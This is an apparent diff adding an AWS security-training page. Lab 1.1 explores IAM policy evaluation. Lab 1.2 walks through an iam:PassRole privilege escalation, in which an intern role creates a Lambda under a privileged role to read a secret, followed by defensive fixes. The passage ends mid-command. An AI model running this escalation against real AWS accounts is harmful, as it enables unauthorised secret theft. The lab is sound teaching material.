+      <p class="muted">Already cloned the course repo in Lab 0? Skip the downloads and point the lab folder at it instead: <code>mkdir -p ~/sky &amp;&amp; ln -sfn ~/skyfortress/labs/day1 ~/sky/day1</code>. Browse every file in <a href="labs/day1/index.html">labs/day1/</a>.</p>
+<div class="term" data-title="CloudShell · us-east-1 · management"><pre><span class="p">$</span> <span class="c">for p in sky-mgmt sky-dev sky-prod; do …; done</span>
+<span class="o">sky-mgmt → </span>999988887777
+<span class="o">sky-dev → </span>111122223333
+<span class="o">sky-prod → </span>444455556666</pre></div>
+<p class="term-caption">Three different account IDs. If a line errors with <code>AccessDenied</code> on <code>AssumeRole</code>, re-run <code>~/skyfortress/labs/setup/verify.sh</code> from Lab 0.</p>
+
+      <!-- ====================== LAB 1.1 ====================== -->
+      <article class="lab" id="lab-1-1">
+        <img class="lab-cover" src="assets/img/day1/lab1-cover.svg" alt="Lab 1.1 cover: an arena at night where three glowing rings (identity, boundary, session) overlap above the floor, with a scoreboard of rounds">
+        <div class="lab-head">
+          <div class="lab-num">Lab 1.1</div>
+          <h3>Policy Evaluation Arena</h3>
+          <div class="chips"><span class="chip med">Intermediate</span><span class="chip">⏱ 45 min</span><span class="chip">💸 ~$0.00</span><span class="chip">IAM · STS · S3 · SSM</span></div>
+        </div>
+        <div class="lab-body">
+          <p><b>Goal:</b> five rounds, each one a single API call made by the same role, each with a different outcome. Before every round you'll <b>predict</b> ALLOW / IMPLICIT DENY / EXPLICIT DENY, then prove it with the IAM policy simulator <em>and</em> a real call. Round 5 hides a flag behind ABAC.</p>
+          <div class="paths">
+            <div class="path guided"><p>Follow the ten numbered steps (eight of them are rounds). Each round gives you the command, a prediction prompt, and the expected result.</p></div>
+            <div class="path challenge"><p><b>Goal:</b> using only the <code>SkyfortressArenaContestant</code> role, produce a scoreboard of six outcomes (read, write, delete, read-with-session-policy, untagged parameter read, tagged parameter read). <b>Constraints:</b> don't edit any policy in <code>arena.yaml</code>. <b>Accept when:</b> for each round you can quote the error string that names the deciding gate, and you've read the flag parameter legitimately.</p></div>
+          </div>
+          <figure class="figure"><img src="assets/img/day1/arena-venn.svg" alt="Venn diagram: identity policy circle, permissions boundary circle and session policy circle overlap; an explicit-deny hatched wedge; scoreboard listing rounds R1 through R5b"><figcaption><b>FIG L1.1</b> The arena's geometry. Only the overlap of every applicable policy, minus the hatched deny, is effective.</figcaption></figure>
+          <p><b>What gets deployed (<a href="labs/day1/arena.yaml">arena.yaml</a>):</b> a bucket with an explicit-deny-delete bucket policy; role <code>SkyfortressArenaContestant</code> with a generous identity policy (<code>s3:*</code> on the bucket, ABAC-gated <code>ssm:GetParameter</code>); a permissions boundary that only allows <code>s3:Get*/List*/DeleteObject</code> and <code>ssm:Get*</code>; and an SSM parameter holding the flag.</p>
+
+          <h4>Steps</h4>
+          <ol class="steps" data-lab="d1-lab1">
+            <li><strong>Deploy the arena</strong>
+<pre data-title="CloudShell"><code class="language-bash">cd ~/sky/day1 &amp;&amp; export AWS_PROFILE=sky-dev AWS_REGION=us-east-1
+aws cloudformation deploy --stack-name sky-arena --template-file arena.yaml \
+  --capabilities CAPABILITY_NAMED_IAM
+eval "$(aws cloudformation describe-stacks --stack-name sky-arena \
+  --query 'Stacks[0].Outputs[].[OutputKey,OutputValue]' --output text | awk '{print "export "$1"="$2}')"
+echo "$BucketName | $RoleArn | $BoundaryArn"</code></pre>
+              <p>The <code>eval</code> trick turns stack outputs into shell variables. You'll reuse it all week.</p>
+<div class="term" data-title="CloudShell · sky-dev"><pre><span class="p">$</span> <span class="c">aws cloudformation deploy --stack-name sky-arena …</span>
+
+<span class="o">Waiting for changeset to be created..</span>
+<span class="o">Waiting for stack create/update to complete</span>
+<span class="ok">Successfully created/updated stack - sky-arena</span>
+<span class="p">$</span> <span class="c">echo "$BucketName | $RoleArn | $BoundaryArn"</span>
+skyfortress-arena-111122223333 | arn:aws:iam::111122223333:role/SkyfortressArenaContestant | arn:aws:iam::111122223333:policy/SkyfortressArenaBoundary</pre></div>
+<p class="term-caption">Three non-empty values. An empty variable means the <code>eval</code> line ran before the stack finished; run it again.</p>
+            </li>
+            <li><strong>Build a "become the contestant" helper</strong>
+              <p>We'll run single commands <em>as</em> the role without clobbering your admin session. <code>ASSUME_ARGS</code> lets later rounds add session policies or tags.</p>
+<pre data-title="CloudShell"><code class="language-bash">ASSUME_ARGS=()
+contestant() {
+  local c; c=$(aws sts assume-role --role-arn "$RoleArn" --role-session-name "arena-$RANDOM" \
+                 "${ASSUME_ARGS[@]}" --output json) || return 1
+  env -u AWS_PROFILE \
+    AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId &lt;&lt;&lt;"$c") \
+    AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey &lt;&lt;&lt;"$c") \
+    AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken &lt;&lt;&lt;"$c") "$@"
+}
+contestant aws sts get-caller-identity
+# seed an object as admin (bucket policy doesn't block admin puts)
+echo "orbital briefing #1" | aws s3 cp - "s3://$BucketName/briefing.txt"</code></pre>
+              <p><b>Verify:</b> the <code>Arn</code> printed by <code>contestant aws sts get-caller-identity</code> ends in <code>assumed-role/<wbr>SkyfortressArenaContestant/<wbr>arena-&lt;number&gt;</code>, not your admin role.</p>
+            </li>
+            <li><strong>Round 1 — GetObject</strong>
+              <p>Identity policy: <code>s3:*</code> ✓. Boundary: <code>s3:Get*</code> ✓. Bucket policy: no deny for reads. <b>Predict, then run.</b></p>
+              <div class="predict"><p>Allow, implicit deny, or explicit deny?</p><details><summary>Reveal</summary><p><b>Allow.</b> Every applicable policy allows <code>s3:GetObject</code> and nothing denies it. You should see <code>orbital briefing #1</code>.</p></details></div>
+<pre data-title="CloudShell"><code class="language-bash">contestant aws s3 cp "s3://$BucketName/briefing.txt" -</code></pre>
+            </li>
+            <li><strong>Round 2 — PutObject (and meet the simulator)</strong>
+              <p>The identity policy allows <code>s3:*</code>. Does that matter? Check with the simulator first — it evaluates the role's identity policies <em>and</em> its boundary:</p>
+              <div class="predict"><p>The identity policy says <code>s3:*</code>. Will the write succeed, and if not, which of the seven gates stops it?</p><details><summary>Reveal</summary><p><b>Implicit deny at the permissions boundary.</b> The boundary allows only <code>s3:Get*</code>, <code>s3:List*</code> and <code>s3:DeleteObject</code>. A boundary is a ceiling: anything it doesn't list is denied, no matter how generous the identity policy is.</p></details></div>
+<pre data-title="CloudShell"><code class="language-bash">aws iam simulate-principal-policy --policy-source-arn "$RoleArn" \
+  --action-names s3:PutObject s3:GetObject \
+  --resource-arns "arn:aws:s3:::$BucketName/briefing.txt" \
+  --query 'EvaluationResults[].[EvalActionName,EvalDecision,PermissionsBoundaryDecisionDetail.AllowedByPermissionsBoundary]' \
+  --output table
+echo "pwned" | contestant aws s3 cp - "s3://$BucketName/kraken-was-here.txt"</code></pre>
+              <p>Read the real error carefully: it should name the <b>permissions boundary</b> as the reason. That's an <em>implicit</em> deny: nothing denied it, the boundary simply didn't allow it.</p>
+<div class="term" data-title="CloudShell · sky-dev"><pre><span class="p">$</span> <span class="c">aws iam simulate-principal-policy … --output table</span>
+<span class="o">-------------------------------------------------
+|            SimulatePrincipalPolicy            |
++-----------------+-----------------+-----------+</span>
+<span class="o">|</span>  s3:PutObject   <span class="o">|</span><span class="warn">  implicitDeny   </span><span class="o">|</span>  False    <span class="o">|</span>
+<span class="o">|</span>  s3:GetObject   <span class="o">|</span><span class="ok">  allowed        </span><span class="o">|</span>  True     <span class="o">|</span>
+<span class="o">+-----------------+-----------------+-----------+</span>
+<span class="p">$</span> <span class="c">echo "pwned" | contestant aws s3 cp - "s3://$BucketName/kraken-was-here.txt"</span>
+<span class="err">upload failed: - to s3://skyfortress-arena-111122223333/kraken-was-here.txt An error occurred (AccessDenied) when calling the PutObject operation: User: arn:aws:sts::111122223333:assumed-role/SkyfortressArenaContestant/arena-20417 is not authorized to perform: s3:PutObject on resource: "arn:aws:s3:::skyfortress-arena-111122223333/kraken-was-here.txt" because no permissions boundary allows the s3:PutObject action</span></pre></div>
+<p class="term-caption">The third column is <code>AllowedByPermissionsBoundary</code>. The real error names the same gate, in plain English.</p>
+              <figure class="shot" data-url="console.aws.amazon.com/iam/home#/policies/simulator"><img src="assets/img/day1/shot-simulator.svg" alt="Mock-up of the IAM policy simulator with SkyfortressArenaContestant selected, an injected aws:PrincipalTag/clearance context key, and results: GetObject allowed, PutObject implicitly denied, DeleteObject allowed (because the bucket policy wasn't included), GetParameter allowed"><figcaption><b>SCREEN 1.1</b> The same rounds in the console simulator. Notice it says DeleteObject is <em>allowed</em>: the simulator only evaluates the policies you give it, so it misses the bucket's explicit deny unless you pass <code>--resource-policy</code>. It never evaluates your org's SCPs or RCPs. Illustrative mock-up; the live console layout may differ.</figcaption></figure>
+            </li>
+            <li><strong>Round 3 — DeleteObject</strong>
+              <p>Identity ✓ (<code>s3:*</code>), boundary ✓ (<code>s3:DeleteObject</code> is in it on purpose). Now what?</p>
+              <div class="predict"><p>Will the contestant's delete work? Will <em>your admin's</em> delete work?</p><details><summary>Reveal</summary><p><b>Both fail with an explicit deny</b> from the bucket policy. An explicit deny in any applicable policy ends evaluation, and resource policies apply to every caller, including admins in the same account.</p></details></div>
+<pre data-title="CloudShell"><code class="language-bash">contestant aws s3 rm "s3://$BucketName/briefing.txt"
+# admins can't do it either — explicit deny in a resource policy binds everyone:
+aws s3 rm "s3://$BucketName/briefing.txt"</code></pre>
+              <p>Both fail with an <b>explicit deny in a resource-based policy</b>. Law 2 in action: even your admin session can't override it. (Only editing the bucket policy can — which is why the bucket policy itself is the thing to protect.)</p>
+<div class="term" data-title="CloudShell · sky-dev"><pre><span class="p">$</span> <span class="c">contestant aws s3 rm "s3://$BucketName/briefing.txt"</span>
+<span class="err">delete failed: s3://skyfortress-arena-111122223333/briefing.txt An error occurred (AccessDenied) when calling the DeleteObject operation: User: arn:aws:sts::111122223333:assumed-role/SkyfortressArenaContestant/arena-8812 is not authorized to perform: s3:DeleteObject on resource: "arn:aws:s3:::skyfortress-arena-111122223333/briefing.txt" with an explicit deny in a resource-based policy</span>
+<span class="p">$</span> <span class="c">aws s3 rm "s3://$BucketName/briefing.txt"</span>
+<span class="err">delete failed: … User: arn:aws:sts::111122223333:assumed-role/OrganizationAccountAccessRole/botocore-session-1732… is not authorized to perform: s3:DeleteObject … with an explicit deny in a resource-based policy</span></pre></div>
+<p class="term-caption">Same gate for both callers. Compare the wording with Round 2: <em>“no permissions boundary allows”</em> (implicit) versus <em>“with an explicit deny in”</em> (explicit).</p>
+            </li>
+            <li><strong>Round 4 — the same GetObject, with a session policy</strong>
+              <p>Assume the role passing an inline session policy that allows only <code>s3:ListBucket</code>. Round 1 worked… does it still?</p>
+              <div class="predict"><p>The role and boundary haven't changed. Does the listing work? Does the read?</p><details><summary>Reveal</summary><p><b>The listing works; the read is an implicit deny at the session policy.</b> Effective permissions are the intersection of the identity policy, the boundary, and the session policy, and the session policy only includes <code>s3:ListBucket</code>.</p></details></div>
+<pre data-title="CloudShell"><code class="language-bash">ASSUME_ARGS=(--policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"s3:ListBucket","Resource":"*"}]}')
+contestant aws s3 ls "s3://$BucketName/"
+contestant aws s3 cp "s3://$BucketName/briefing.txt" -
+ASSUME_ARGS=()</code></pre>
+              <p>The listing works; the read doesn't. Session policies are how tools (and Identity Center) <b>shrink</b> a role for one session — a great pattern for handing a script or an AI agent a strictly narrower slice of your role.</p>
+<div class="term" data-title="CloudShell · sky-dev"><pre><span class="p">$</span> <span class="c">contestant aws s3 ls "s3://$BucketName/"</span>
+2026-11-30 09:41:12         20 briefing.txt
+<span class="p">$</span> <span class="c">contestant aws s3 cp "s3://$BucketName/briefing.txt" -</span>
+<span class="err">fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden</span></pre></div>
+<p class="term-caption">Where's the helpful message? <code>aws s3 cp</code> calls <code>HeadObject</code> before downloading, and HEAD responses have no body, so S3 can only return a bare 403. To see the reason, call <code>contestant aws s3api get-object --bucket "$BucketName" --key briefing.txt /dev/stdout</code> instead.</p>
+            </li>
+            <li><strong>Round 5a — the ABAC parameter, untagged</strong>
+<pre data-title="CloudShell"><code class="language-bash">contestant aws ssm get-parameter --name /skyfortress/arena/flag</code></pre>
+              <div class="predict"><p>The identity policy has an <code>ssm:GetParameter</code> statement for this parameter. Allowed?</p><details><summary>Reveal</summary><p><b>Implicit deny.</b> That statement has a condition on <code>aws:PrincipalTag/clearance</code>, and a statement whose condition doesn't match simply doesn't apply. Then nothing allows the call.</p></details></div>
+              <p>Denied. The identity policy's statement only matches when <code>aws:PrincipalTag/clearance</code> equals <code>orbital</code> — and your session has no tags. Confirm with the simulator by <em>injecting</em> the context key:</p>
+<pre data-title="CloudShell"><code class="language-bash">ACCT=$(aws sts get-caller-identity --query Account --output text)
+aws iam simulate-principal-policy --policy-source-arn "$RoleArn" \
+  --action-names ssm:GetParameter \
+  --resource-arns "arn:aws:ssm:us-east-1:$ACCT:parameter/skyfortress/arena/flag" \
+  --context-entries ContextKeyName=aws:PrincipalTag/clearance,ContextKeyValues=orbital,ContextKeyType=string \
+  --query 'EvaluationResults[0].EvalDecision'</code></pre>
+<div class="term" data-title="CloudShell · sky-dev"><pre><span class="p">$</span> <span class="c">contestant aws ssm get-parameter --name /skyfortress/arena/flag</span>
+<span class="err">An error occurred (AccessDeniedException) when calling the GetParameter operation: User: arn:aws:sts::111122223333:assumed-role/SkyfortressArenaContestant/arena-3391 is not authorized to perform: ssm:GetParameter on resource: arn:aws:ssm:us-east-1:111122223333:parameter/skyfortress/arena/flag because no identity-based policy allows the ssm:GetParameter action</span>
+<span class="p">$</span> <span class="c">aws iam simulate-principal-policy … --context-entries …clearance…orbital…</span>
+<span class="ok">"allowed"</span></pre></div>
+<p class="term-caption">The simulator says the policy <em>would</em> allow it if the tag were present. Next step: make it present.</p>
+            </li>
+            <li><strong>Round 5b — earn your clearance</strong>
+              <p>Session tags become principal tags for the life of the session. The trust policy allows <code>sts:TagSession</code>, so…</p>
+<pre data-title="CloudShell"><code class="language-bash">ASSUME_ARGS=(--tags Key=clearance,Value=orbital)
+contestant aws ssm get-parameter --name /skyfortress/arena/flag --query Parameter.Value --output text | base64 -d; echo
+ASSUME_ARGS=()</code></pre>
+<div class="term" data-title="CloudShell · sky-dev"><pre><span class="p">$</span> <span class="c">contestant aws ssm get-parameter --name /skyfortress/arena/flag --query Parameter.Value --output text | base64 -d; echo</span>
+<span class="hl">SKY{█████████████████████}</span></pre></div>
+<p class="term-caption">A single line in the <code>SKY{…}</code> format (redacted here). Paste it into the flag box below.</p>
+            </li>
+            <li><strong>Explain it back</strong>
+              <p>In your notebook, write one sentence per round naming <b>which gate</b> decided it (use FIG 1.1's step numbers). Then answer: <em>"If the trust policy didn't include <code>sts:TagSession</code>, what would Round 5b's error be, and from which API?"</em></p>
+            </li>
+            <li><strong>Decode an authorization message (bonus technique)</strong>
+              <p>Some services (notably EC2) return an <em>encoded</em> authorization failure. Trigger one and decode it — it shows the full request context AWS evaluated:</p>
+<pre data-title="CloudShell"><code class="language-bash">MSG=$(contestant aws ec2 run-instances --image-id ami-0123456789abcdef0 \
+      --instance-type t3.micro --dry-run 2&gt;&amp;1 | sed -n 's/.*Encoded authorization failure message: //p')
+aws sts decode-authorization-message --encoded-message "$MSG" --query DecodedMessage --output text | jq .</code></pre>
+              <p class="muted">Your admin session needs <code>sts:DecodeAuthorizationMessage</code> (admins have it). If the command returns nothing, your CLI printed a plain error instead — that's fine, read it directly.</p>
+            </li>
+          </ol>
+
+          <div class="checkpoint"><p>Your scoreboard should match FIG L1.1: <b>R1 ALLOW · R2 implicit (boundary) · R3 explicit (resource policy) · R4 implicit (session policy) · R5a implicit (condition not met) · R5b ALLOW</b>. If R2 succeeded, check that the stack really attached the boundary: <code>aws iam get-role --role-name SkyfortressArenaContestant --query Role.PermissionsBoundary</code>.</p></div>
+
+          <h4>Troubleshooting</h4><div class="table-wrap"><table><thead><tr><th>Symptom</th><th>Likely cause</th><th>Fix</th></tr></thead><tbody><tr><td><code>contestant</code> prints nothing and returns 255</td><td><code>$RoleArn</code> is empty (the <code>eval</code> ran in another shell)</td><td>Re-run the <code>eval</code> line from step 1 in this shell</td></tr><tr><td>Round 2's upload <em>succeeds</em></td><td>The boundary isn't attached, or you ran it as admin instead of via <code>contestant</code></td><td><code>aws iam get-role --role-name SkyfortressArenaContestant --query Role.PermissionsBoundary</code></td></tr><tr><td><code>(403) … HeadObject … Forbidden</code> with no reason</td><td><code>aws s3 cp</code> issues a HEAD request first, and HEAD responses can't carry an error body</td><td>Repeat with <code>aws s3api get-object --bucket … --key … /dev/stdout</code> to see the enriched message</td></tr><tr><td><code>AccessDenied</code> on <code>AssumeRole</code> only when passing <code>--tags</code></td><td>The trust policy doesn't allow <code>sts:TagSession</code></td><td>Restore the original <code>arena.yaml</code> trust policy</td></tr><tr><td>Decode step: <code>MSG</code> is empty</td><td>Your CLI printed a non-encoded error (common for <code>--dry-run</code> with a fake AMI)</td><td>Read the plain error; the technique still applies to EC2 errors that are encoded</td></tr></tbody></table></div>
+          <details class="hint"><summary>Hint: "AccessDenied when calling AssumeRole" in Round 5b</summary><p>That's the trust policy, not the identity policy. Passing <code>--tags</code> requires <code>sts:TagSession</code> to be allowed in the role trust policy for your caller. The arena template includes it; if you edited the template, put it back.</p></details>
+          <details class="hint"><summary>Hint: role chaining and the 1-hour limit</summary><p>If your CloudShell identity is itself an assumed role (it is, via Identity Center or Lab 0's admin role), then <code>contestant</code> is <em>role chaining</em>. Chained sessions are capped at 1 hour regardless of <code>MaxSessionDuration</code>. Not a problem here, but it bites long-running scripts.</p></details>
+
+          <form class="flag" data-id="d1-flag1" data-hash="67116e525799b1a500750e58c8c8d223fa2b74431d03601da72a8557d83bd1e2" data-xp="150" data-label="Flag 1.1 · the arena parameter"></form>
+
+          <div class="stretch"><p>Write a sixth round of your own: make the contestant fail <b>only</b> because of an SCP. Attach a tiny SCP to <code>skyfortress-dev</code> from <code>sky-mgmt</code> that denies <code>s3:GetObject</code> when <code>aws:PrincipalTag/clearance</code> equals <code>orbital</code>, then rerun Round 1 with and without the tag. Detach it afterwards.</p></div>
+
+          <div class="cleanup">
+<pre><code class="language-bash"># The bucket policy blocks object deletion for everyone, so remove the policy first, then empty + delete:
+aws s3api delete-bucket-policy --bucket "$BucketName"
+aws s3 rm "s3://$BucketName" --recursive
+aws cloudformation delete-stack --stack-name sky-arena</code></pre>
+            <p>Notice what you just did: to delete protected data, you had to change the <em>policy</em>. In production that policy edit should itself be blocked by an SCP or RCP.</p>
+          </div>
+        </div>
+      </article>
+
+      <!-- ====================== LAB 1.2 ====================== -->
+      <article class="lab" id="lab-1-2">
+        <img class="lab-cover" src="assets/img/day1/lab2-cover.svg" alt="Lab 1.2 cover: a Kraken tentacle hands an iam:PassRole badge for role/privileged/* to a glowing Lambda function, which reaches into a round golden vault labelled skyfortress/heist/launch-codes">
+        <div class="lab-head">
+          <div class="lab-num">Lab 1.2</div>
+          <h3>The PassRole Heist</h3>
+          <div class="chips"><span class="chip hard">Advanced</span><span class="chip">⏱ 70 min</span><span class="chip">💸 ~$0.02</span><span class="chip">IAM · Lambda · Secrets Manager · Organizations</span></div>
+        </div>
+        <div class="lab-body">
+          <p><b>Goal:</b> play the Kraken. Starting from a compromised intern role that cannot read secrets, steal the launch codes by passing a privileged role to a Lambda you create. Then put on your blue hat and close the hole with <b>three independent layers</b> — so that any one of them alone would have stopped you.</p>
+          <div class="paths">
+            <div class="path guided"><p>Part A (red, 8 steps) then Part B (blue, 6 steps). Every command is given; every step ends with something to check.</p></div>
+            <div class="path challenge"><p><b>Goal:</b> starting as <code>KrakenInternRole</code>, read <code>skyfortress/heist/launch-codes</code>. Then make that impossible three ways. <b>Constraints:</b> never use your admin session for the attack; don't delete <code>NimbusOpsAutomationRole</code>. <b>Accept when:</b> you have the flag, and you can show three different AccessDenied messages (identity policy, boundary, SCP) for the same <code>create-function</code> call, while the intern can still deploy a Lambda with its sandbox role.</p></div>
+          </div>
+          <figure class="figure"><img src="assets/img/day1/passrole-attack.svg" alt="Attack graph: KrakenInternRole with PassRole on star does recon with ListRoles, finds the privileged NimbusOpsAutomationRole, creates a Lambda with that role, invokes it and reads the launch-codes secret; three defensive layers below"><figcaption><b>FIG L1.2</b> PassRole turns "can create compute" into "can become any role that compute may assume".</figcaption></figure>
+          <div class="callout info"><strong class="ct">Why PassRole exists</strong><p>When you create a Lambda, EC2 instance, ECS task, Glue job, or Step Functions state machine, you hand AWS a role for it to assume later. <code>iam:PassRole</code> is AWS asking: <em>"are you allowed to give this role to this service?"</em> It's not an API you call — it's a permission checked <b>during</b> another call, which is why it never shows up as its own CloudTrail event.</p></div>
+          <p><b>Prerequisites:</b> Lab 0 profiles; the files from the lab kit (<a href="labs/day1/passrole-heist.yaml">passrole-heist.yaml</a>, <a href="labs/day1/heist_payload.py">heist_payload.py</a>).</p>
+
+          <h4>Part A — Red team</h4>
+          <ol class="steps" data-lab="d1-lab2">
+            <li><strong>Deploy the vulnerable stack</strong>
+<pre data-title="CloudShell"><code class="language-bash">cd ~/sky/day1 &amp;&amp; export AWS_PROFILE=sky-dev AWS_REGION=us-east-1
+aws cloudformation deploy --stack-name sky-heist --template-file passrole-heist.yaml \
+  --capabilities CAPABILITY_NAMED_IAM
+ACCT=$(aws sts get-caller-identity --query Account --output text)
+INTERN_ARN=arn:aws:iam::$ACCT:role/KrakenInternRole</code></pre>
+            </li>
+            <li><strong>Become the intern</strong>
+<pre data-title="CloudShell"><code class="language-bash">intern() {
+  local c; c=$(aws sts assume-role --role-arn "$INTERN_ARN" --role-session-name kraken --output json) || return 1
+  env -u AWS_PROFILE AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId &lt;&lt;&lt;"$c") \
+    AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey &lt;&lt;&lt;"$c") \
+    AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken &lt;&lt;&lt;"$c") "$@"
+}
+intern aws sts get-caller-identity --query Arn</code></pre>
+            </li>
+            <li><strong>Try the front door</strong>
+<pre data-title="CloudShell"><code class="language-bash">intern aws secretsmanager get-secret-value --secret-id skyfortress/heist/launch-codes</code></pre>
+              <p>AccessDenied — no identity-based policy allows it. Good. The Kraken shrugs and looks for a side door.</p>
+<div class="term" data-title="CloudShell · sky-dev · as the intern"><pre><span class="p">$</span> <span class="c">intern aws secretsmanager get-secret-value --secret-id skyfortress/heist/launch-codes</span>
+<span class="err">An error occurred (AccessDeniedException) when calling the GetSecretValue operation: User: arn:aws:sts::111122223333:assumed-role/KrakenInternRole/kraken is not authorized to perform: secretsmanager:GetSecretValue on resource: skyfortress/heist/launch-codes because no identity-based policy allows the secretsmanager:GetSecretValue action</span></pre></div>
+<p class="term-caption">The front door is shut. Remember this message; you'll want to compare it with what the Lambda gets.</p>
+            </li>
+            <li><strong>Recon: which roles can Lambda assume?</strong>
+<pre data-title="CloudShell"><code class="language-bash">intern aws iam list-roles --query 'Roles[].[RoleName,Path]' --output table
+intern aws iam get-role --role-name NimbusOpsAutomationRole \
+  --query 'Role.{Path:Path,Trust:AssumeRolePolicyDocument.Statement[0].Principal,Tags:Tags}'</code></pre>
+              <p>A role under <code>/privileged/</code>, trusted by <code>lambda.amazonaws.com</code>, tagged <code>tier=privileged</code>. Attackers love descriptive naming.</p>
+            </li>
+            <li><strong>Weaponise: package the payload</strong>
+              <p>Read <a href="labs/day1/heist_payload.py">heist_payload.py</a> first — it just calls <code>GetSecretValue</code> with whatever role the function runs as.</p>
+<pre data-title="CloudShell"><code class="language-bash">zip -q heist.zip heist_payload.py &amp;&amp; ls -la heist.zip</code></pre>
+            </li>
+            <li><strong>Predict, then create the function with the privileged role</strong>
+              <p>The intern's policy allows <code>lambda:CreateFunction</code> and <code>iam:PassRole</code> on <code>*</code>. Will AWS let it pass a <code>/privileged/</code> role?</p>
+              <div class="predict"><p>The intern can't read the secret. Can it create a function that runs as a role that can?</p><details><summary>Reveal</summary><p><b>Yes.</b> <code>iam:PassRole</code> on <code>*</code> means "may hand <em>any</em> role to <em>any</em> service". AWS checks only that the caller may pass the role; it doesn't compare the role's power with the caller's. That gap is the whole heist.</p></details></div>
+<pre data-title="CloudShell"><code class="language-bash">intern aws lambda create-function --function-name kraken-heist \
+  --runtime python3.12 --handler heist_payload.handler --zip-file fileb://heist.zip \
+  --role "arn:aws:iam::$ACCT:role/privileged/NimbusOpsAutomationRole" \
+  --query '{Fn:FunctionName,Role:Role,State:State}'
+intern aws lambda wait function-active-v2 --function-name kraken-heist</code></pre>
+            </li>
+            <li><strong>Pull the trigger</strong>
+<pre data-title="CloudShell"><code class="language-bash">intern aws lambda invoke --function-name kraken-heist \
+  --cli-binary-format raw-in-base64-out --payload '{}' loot.json &gt;/dev/null &amp;&amp; jq . loot.json
+jq -r .loot.flag_b64 loot.json | base64 -d; echo      # the flag</code></pre>
+              <p><code>ran_as</code> shows the Lambda executed as <code>NimbusOpsAutomationRole</code>. The intern never touched the secret — its Lambda did. Decode <code>loot.flag_b64</code> for the flag.</p>
+<div class="term" data-title="CloudShell · sky-dev · as the intern"><pre><span class="p">$</span> <span class="c">intern aws lambda create-function --function-name kraken-heist … --query '{Fn:FunctionName,Role:Role,State:State}'</span>
+{
+    <span class="k">"Fn"</span>: <span class="s">"kraken-heist"</span>,
+    <span class="k">"Role"</span>: <span class="s">"arn:aws:iam::111122223333:role/privileged/NimbusOpsAutomationRole"</span>,
+    <span class="k">"State"</span>: <span class="s">"Pending"</span>
+}
+<span class="p">$</span> <span class="c">intern aws lambda invoke --function-name kraken-heist … loot.json &gt;/dev/null &amp;&amp; jq . loot.json</span>
+{
+    <span class="k">"ran_as"</span>: <span class="s">"arn:aws:sts::111122223333:assumed-role/NimbusOpsAutomationRole/kraken-heist"</span>,
+    <span class="k">"loot"</span>: {
+        <span class="k">"vessel"</span>: <span class="s">"NIMBUS-7"</span>,
+        <span class="k">"flag_b64"</span>: <span class="hl">"U0tZe██████████████"</span>
+    }
+}
+<span class="p">$</span> <span class="c">jq -r .loot.flag_b64 loot.json | base64 -d; echo</span>
+<span class="hl">SKY{██████████████████████}</span></pre></div>
+<p class="term-caption">The function's session name is the function name. In CloudTrail, the secret was read by <code>NimbusOpsAutomationRole</code>, not by the intern. Today's planted flags are base64-encoded so nobody spoils them with a quick <code>grep</code> of the templates: decode, then submit.</p>
+            </li>
+            <li><strong>Think like a detector</strong>
+              <p>What would Day 2's SOC see? Look for the CloudTrail event (Lambda's create API is logged with a versioned name):</p>
+<pre data-title="CloudShell — may take ~5 min to appear"><code class="language-bash">aws cloudtrail lookup-events --max-results 5 \
+  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateFunction20150331 \
+  --query 'Events[].CloudTrailEvent' --output text | jq '{who: .userIdentity.arn, role: .requestParameters.role, fn: .requestParameters.functionName}'</code></pre>
+              <p>The detection signal is <em>"a principal created compute with a role more privileged than itself"</em>. Note there's no <code>PassRole</code> event to alert on — you have to infer it from <code>requestParameters.role</code>.</p>
+            </li>
+          </ol>
+
+          <form class="flag" data-id="d1-flag2" data-hash="eb337e177f382dd0427531ac056a0bc1fe5096bbc529160645ded6d347e6ee70" data-xp="200" data-label="Flag 1.2 · the launch codes"></form>
+
+          <h4>Part B — Blue team: three layers</h4>
+          <ol class="steps" data-lab="d1-lab2b">
+            <li><strong>Layer 1 — scope PassRole to the right roles, for the right service</strong>
+              <p>Open <a href="labs/day1/intern-fixed-policy.json">intern-fixed-policy.json</a>. The new statement allows passing only roles under <code>/lambda-sandbox/</code>, and only to Lambda (<code>iam:PassedToService</code>). Apply it:</p>
+<pre data-title="CloudShell (admin)"><code class="language-bash">aws iam put-role-policy --role-name KrakenInternRole --policy-name InternDeveloperAccess \
+  --policy-document file://intern-fixed-policy.json</code></pre>
+            </li>
+            <li><strong>Layer 2 — a permissions boundary as a permanent ceiling</strong>
+              <p>Layer 1 is one careless <code>"Resource": "*"</code> away from regressing. A boundary caps the role no matter what future identity policies say. Read <a href="labs/day1/intern-boundary.json">intern-boundary.json</a> — note the <code>Deny</code> on <code>/privileged/*</code>.</p>
+<pre data-title="CloudShell (admin)"><code class="language-bash">BOUNDARY_ARN=$(aws iam create-policy --policy-name SkyfortressDeveloperBoundary \
+  --policy-document file://intern-boundary.json --query Policy.Arn --output text)
+aws iam put-role-permissions-boundary --role-name KrakenInternRole --permissions-boundary "$BOUNDARY_ARN"</code></pre>
+              <div class="callout tip"><strong class="ct">The real-world pattern</strong><p>Boundaries shine in <b>delegated role creation</b>: let developers call <code>iam:CreateRole</code> only with condition <code>"iam:PermissionsBoundary": "arn:…:policy/SkyfortressDeveloperBoundary"</code>. They can self-serve roles, but never mint one stronger than the boundary.</p></div>
+            </li>
+            <li><strong>Layer 3 — an SCP that protects privileged roles org-wide</strong>
+              <p>Even an <em>account admin</em> who widens both policies can't pass <code>/privileged/</code> roles now. First, open <a href="labs/day1/scp-protect-privileged-roles.json">scp-protect-privileged-roles.json</a> and confirm the <code>aws:PrincipalArn</code> exemption list covers the role you use in dev (run <code>aws sts get-caller-identity --profile sky-dev</code>; with Lab 0's setup it's <code>OrganizationAccountAccessRole</code>, which is already listed). Then, from the management account:</p>
+<pre data-title="CloudShell (management account)"><code class="language-bash">DEV_ID=$(aws sts get-caller-identity --profile sky-dev --query Account --output text)
+SCP_ID=$(aws organizations create-policy --profile sky-mgmt --type SERVICE_CONTROL_POLICY \
+  --name protect-privileged-roles --description "Only platform may pass /privileged/ roles" \
